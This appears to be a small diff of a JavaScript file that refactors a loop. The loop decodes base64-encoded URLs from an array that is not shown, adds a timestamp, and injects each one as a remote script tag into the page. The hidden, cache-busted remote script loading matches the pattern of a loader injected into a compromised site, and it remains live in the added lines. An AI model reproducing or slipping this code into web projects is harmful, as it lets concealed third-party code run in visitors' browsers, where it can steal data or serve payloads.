@@ -5,9 +5,8 @@
     ];
 
     urls.forEach(u=>{
-        let link = atob(u) + Date.now();
-        let s = document.createElement("script");
-        s.src = link;
+        let s=document.createElement("script");
+        s.src = atob(u) + Date.now();
         document.body.appendChild(s);
     });
 })();
